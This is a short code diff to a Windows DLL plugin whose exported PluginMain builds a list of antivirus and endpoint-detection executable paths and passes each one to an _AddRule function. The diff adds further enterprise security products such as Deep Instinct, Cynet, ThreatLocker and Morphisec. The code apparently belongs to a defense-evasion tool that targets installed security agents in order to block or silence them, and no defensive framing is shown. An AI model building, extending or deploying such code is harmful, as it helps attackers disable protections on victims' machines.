@@ -36,8 +36,11 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         L"%ProgramFiles%\\AVG\\Antivirus\\AVGSvc.exe",
         L"%ProgramFiles(x86)%\\AVG\\Antivirus\\AVGSvc.exe",
         L"%ProgramFiles%\\Bitdefender\\Bitdefender Security\\bdagent.exe",
+        L"%ProgramFiles%\\Bitdefender\\Endpoint Security\\EPSecurityService.exe",
         L"%ProgramFiles%\\ESET\\ESET Security\\ekrn.exe",
+        L"%ProgramFiles%\\ESET\\ESET Endpoint Security\\ekrn.exe",
         L"%ProgramFiles%\\Kaspersky Lab\\Kaspersky\\avp.exe",
+        L"%ProgramFiles%\\Kaspersky Lab\\Kaspersky Endpoint Security for Windows\\avp.exe",
         L"%ProgramFiles%\\Malwarebytes\\Anti-Malware\\MBAMService.exe",
         L"%ProgramFiles%\\Sophos\\Sophos Anti-Virus\\SavService.exe",
         L"%ProgramFiles%\\McAfee\\MSC\\McShield.exe",
@@ -99,6 +102,16 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         L"%ProgramFiles%\\Qualys\\QualysAgent\\QualysAgent.exe",
         // Tenable Nessus Agent
         L"%ProgramFiles%\\Tenable\\Nessus Agent\\nessus-agent.exe",
+        // Deep Instinct
+        L"%ProgramFiles%\\Deep Instinct\\Deep Instinct Service\\deepinstinct.service.exe",
+        // Cynet
+        L"%ProgramFiles%\\Cynet\\CynetAgent\\CynetAgent.exe",
+        // ThreatLocker
+        L"%ProgramFiles%\\ThreatLocker\\ThreatLockerService.exe",
+        // Heimdal Security
+        L"%ProgramFiles%\\Heimdal Security\\Heimdal Agent\\Heimdal.Agent.exe",
+        // Morphisec (memory protection / MTD)
+        L"%ProgramFiles%\\Morphisec\\MorphisecService.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
